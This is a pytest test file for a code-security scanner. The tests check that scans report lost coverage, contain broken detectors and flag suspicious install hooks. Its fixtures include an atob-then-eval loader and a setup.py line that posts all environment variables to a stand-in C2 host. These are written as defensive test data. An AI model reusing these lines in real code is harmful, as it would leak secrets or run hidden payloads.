"""Engine orchestration.

The engine's job is to run phases in the right order and to never lose coverage
silently. Most of these tests are about the second part.

A scanner that quietly stops examining things produces output indistinguishable
from a clean result, so every way coverage can shrink -- an unreadable file, a
timeout, a limit, a broken detector, an exclusion that matches nothing -- has a
test asserting that it is *reported*, not merely survived.
"""

from __future__ import annotations

import pytest

from cordon import Scanner
from cordon.core.config import Config
from cordon.core.engine import Engine
from cordon.core.models import Category, Finding, Severity
from cordon.detect.base import DetectorRequirements, ScanContext


def config(**kw) -> Config:
    return Config.default().with_overrides(use_cache=False, **kw)


@pytest.fixture
def project(tmp_path):
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    (root / "src" / "app.js").write_text("export const x = 1;\n")
    (root / "src" / "loader.js").write_text("const p = atob(B);\neval(p);\n")
    (root / "package.json").write_text(
        '{"name":"demo","version":"1.0.0","scripts":{"postinstall":"node s.js"},'
        '"dependencies":{"express":"^4.18.0"}}'
    )
    (root / "package-lock.json").write_text(
        '{"lockfileVersion":3,"packages":{"":{"name":"demo"},'
        '"node_modules/express":{"version":"4.18.2","integrity":"sha512-a",'
        '"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}'
    )
    return root


# ---------------------------------------------------------------------------
# Inventory
# ---------------------------------------------------------------------------


class TestInventory:
    def test_identifies_languages_by_byte_weight(self, project) -> None:
        """Byte weighting reflects what a repository is better than file count,
        which over-weights many small config files."""
        inventory = Scanner(config()).inventory(project)
        assert inventory.languages
        sizes = [stat.bytes for stat in inventory.languages]
        assert sizes == sorted(sizes, reverse=True)

    def test_records_evidence_for_each_conclusion(self, project) -> None:
        """Inventory that cannot explain itself cannot be debugged when wrong."""
        inventory = Scanner(config()).inventory(project)
        for stat in inventory.languages:
            assert stat.evidence

    def test_detects_ecosystems_and_projects(self, project) -> None:
        inventory = Scanner(config()).inventory(project)
        assert "npm" in inventory.ecosystems
        assert any(p.ecosystem == "npm" for p in inventory.projects)

    def test_surfaces_manifest_lifecycle_hooks(self, project) -> None:
        """The most useful thing this phase can report: code that runs before
        any other control, invisible from the path alone."""
        inventory = Scanner(config()).inventory(project)
        assert any(h.name == "postinstall" for h in inventory.hooks)

    def test_an_empty_directory_is_not_an_error(self, tmp_path) -> None:
        inventory = Scanner(config()).inventory(tmp_path)
        assert inventory.file_count == 0
        assert inventory.languages == ()


# ---------------------------------------------------------------------------
# Dependency graph
# ---------------------------------------------------------------------------


class TestDependencyGraph:
    def test_is_built_from_the_lockfile(self, project) -> None:
        result = Scanner(config()).scan(project)
        assert result.dependencies
        assert any(d.name == "express" for d in result.dependencies)

    def test_is_deterministic_and_deduplicated(self, project) -> None:
        first = Scanner(config()).scan(project).dependencies
        second = Scanner(config()).scan(project).dependencies
        assert [d.purl for d in first] == [d.purl for d in second]
        assert len({d.purl for d in first}) == len(first)

    def test_stats_report_the_dependency_count(self, project) -> None:
        result = Scanner(config()).scan(project)
        assert result.stats.dependencies == len(result.dependencies)

    def test_no_lockfile_yields_an_empty_graph(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text("const x = 1;\n")
        assert Scanner(config()).scan(tmp_path).dependencies == ()


# ---------------------------------------------------------------------------
# Coverage is never lost silently
# ---------------------------------------------------------------------------


class TestCoverageReporting:
    def test_a_timeout_is_reported_and_marks_the_scan_incomplete(self, project) -> None:
        result = Scanner(config(limits=Config.default().limits.merged(total_timeout=0.0))).scan(
            project
        )
        assert result.complete is False
        assert any(f.rule_id == "OPERATIONAL.SCAN.TIMEOUT" for f in result.findings)

    def test_a_file_limit_is_reported(self, project) -> None:
        result = Scanner(config(limits=Config.default().limits.merged(max_files=1))).scan(project)
        assert result.complete is False
        assert any(f.rule_id == "OPERATIONAL.SCAN.LIMIT" for f in result.findings)

    def test_an_exclusion_matching_nothing_is_reported(self, project) -> None:
        """An exclusion for a path that does not exist is a hole held open for
        a file nobody would notice appearing."""
        result = Scanner(config(exclude=("does-not-exist/",))).scan(project)
        assert any(f.rule_id == "POLICY.EXCLUDE.UNMATCHED" for f in result.findings)

    def test_an_exclusion_that_matches_is_not_reported(self, project) -> None:
        result = Scanner(config(exclude=("**/*.js",))).scan(project)
        assert not [f for f in result.findings if f.rule_id == "POLICY.EXCLUDE.UNMATCHED"]

    def test_operational_findings_survive_the_reporting_threshold(self, project) -> None:
        """Hiding them behind a threshold is how a scan that examined almost
        nothing comes to look clean."""
        result = Scanner(
            config(
                severity_threshold=Severity.CRITICAL,
                limits=Config.default().limits.merged(max_files=1),
            )
        ).scan(project)
        assert any(f.category is Category.OPERATIONAL for f in result.findings)


# ---------------------------------------------------------------------------
# Detector containment
# ---------------------------------------------------------------------------


class BrokenDetector:
    id = "broken"
    version = "1.0.0"
    categories = frozenset({Category.SUSPICIOUS})
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        return True

    def inspect(self, unit, ctx):
        raise RuntimeError("detector exploded")


class MisplacedDetector:
    """Reports a finding about a file it was not given."""

    id = "misplaced"
    version = "1.0.0"
    categories = frozenset({Category.SUSPICIOUS})
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        return True

    def inspect(self, unit, ctx):
        from cordon.core.models import Confidence as _Confidence
        from cordon.core.models import (
            Evidence,
            EvidenceKind,
            Explanation,
            Location,
            RedactionMode,
            RiskScore,
        )

        yield Finding(
            rule_id="BAD.LOCATION.001",
            category=Category.SUSPICIOUS,
            severity=Severity.LOW,
            confidence=_Confidence.LOW,
            message="wrong place",
            location=Location(path="somewhere/else.py"),
            evidence=Evidence(
                kind=EvidenceKind.METADATA,
                match_hash="sha256:x",
                redaction=RedactionMode.NONE,
            ),
            remediation="n/a",
            explanation=Explanation(summary="s", matched_rule="BAD.LOCATION.001"),
            risk=RiskScore(value=0, base=0, confidence_multiplier=1.0),
            detector="misplaced",
        )


class TestDetectorContainment:
    def test_a_failing_detector_does_not_abort_the_scan(self, project) -> None:
        """One broken detector silently reducing coverage everywhere is far
        worse than one loud finding saying it broke."""
        engine = Engine(config(), detectors=[BrokenDetector()])
        result = engine.scan(project)
        assert result.complete is False
        assert any(f.rule_id == "OPERATIONAL.DETECTOR.FAILED" for f in result.findings)

    def test_the_failure_names_the_detector(self, project) -> None:
        engine = Engine(config(), detectors=[BrokenDetector()])
        failures = [
            f for f in engine.scan(project).findings if f.rule_id == "OPERATIONAL.DETECTOR.FAILED"
        ]
        assert failures
        assert "broken" in failures[0].message

    def test_a_misplaced_finding_is_dropped_and_reported(self, project) -> None:
        """A detector that reports about a file it was not given is a bug, and
        accepting it silently would make findings untraceable.

        It is reported and dropped rather than raised. The check sat outside the
        handler that exists so "a detector that raises must not abort the scan",
        so a detector mislabelling one finding killed the entire run on the
        first file it touched -- the exact outcome the surrounding method is
        written to prevent.
        """
        engine = Engine(config(), detectors=[MisplacedDetector()])
        result = engine.scan(project)

        assert result.complete is False
        assert "OPERATIONAL.DETECTOR.STRAY_FINDING" in {f.rule_id for f in result.findings}
        assert not [f for f in result.findings if f.rule_id == "BAD.LOCATION.001"], (
            "the stray finding itself must not survive"
        )


# ---------------------------------------------------------------------------
# Result integrity
# ---------------------------------------------------------------------------


class TestResultIntegrity:
    def test_the_result_records_what_produced_it(self, project) -> None:
        result = Scanner(config()).scan(project)
        assert result.rulepack_hash
        assert result.config_hash
        assert result.engine_version
        assert result.schema_version >= 1

    def test_findings_are_sorted(self, project) -> None:
        findings = [
            f
            for f in Scanner(config()).scan(project).findings
            if f.category is not Category.OPERATIONAL
        ]
        severities = [int(f.severity) for f in findings]
        assert severities == sorted(severities, reverse=True)

    def test_disabling_a_detector_removes_its_findings(self, project) -> None:
        result = Scanner(config(detectors={"manifest": False})).scan(project)
        assert "manifest" not in {f.detector for f in result.findings}

    def test_config_hash_changes_with_configuration(self, project) -> None:
        a = Scanner(config()).scan(project).config_hash
        b = Scanner(config(severity_threshold=Severity.CRITICAL)).scan(project).config_hash
        assert a != b

    def test_scanning_a_single_file_works(self, project) -> None:
        result = Scanner(config()).scan(project / "src" / "loader.js")
        assert result.stats.files_scanned == 1
        assert any(f.rule_id == "SUSPECT.DECODE_EXEC.001" for f in result.findings)

    def test_scanning_an_empty_directory_is_clean(self, tmp_path) -> None:
        result = Scanner(config()).scan(tmp_path)
        assert result.findings == ()
        assert result.complete is True


# ---------------------------------------------------------------------------
# Install-hook context
# ---------------------------------------------------------------------------


class TestInstallHookContext:
    def test_manifest_hooks_enter_the_scoring_context(self, tmp_path) -> None:
        """Hooks are discovered while scanning and change how every later
        finding is scored, so they must be folded in before detectors run."""
        root = tmp_path / "repo"
        root.mkdir()
        (root / "setup.py").write_text(
            "import os, urllib.request\n"
            "urllib.request.urlopen('https://c2.example.net/i', "
            "str(dict(os.environ)).encode())\n"
        )
        result = Scanner(config()).scan(root)
        assert any(f.category is Category.MALICIOUS for f in result.findings)

    def test_the_same_code_elsewhere_is_not_malicious(self, tmp_path) -> None:
        root = tmp_path / "repo"
        root.mkdir()
        (root / "reporting.py").write_text(
            "import os, urllib.request\n"
            "urllib.request.urlopen('https://c2.example.net/i', "
            "str(dict(os.environ)).encode())\n"
        )
        result = Scanner(config()).scan(root)
        assert not [f for f in result.findings if f.category is Category.MALICIOUS]
